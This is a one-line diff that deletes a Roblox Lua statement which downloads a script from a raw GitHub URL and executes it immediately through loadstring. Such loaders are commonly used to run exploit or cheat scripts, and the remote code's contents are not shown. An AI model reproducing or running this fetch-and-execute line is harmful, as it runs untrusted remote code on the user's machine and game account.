@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Rinaldo1811/Rinaldo1811/refs/heads/main/Desentorta%20minha%20piroca.lua"))()
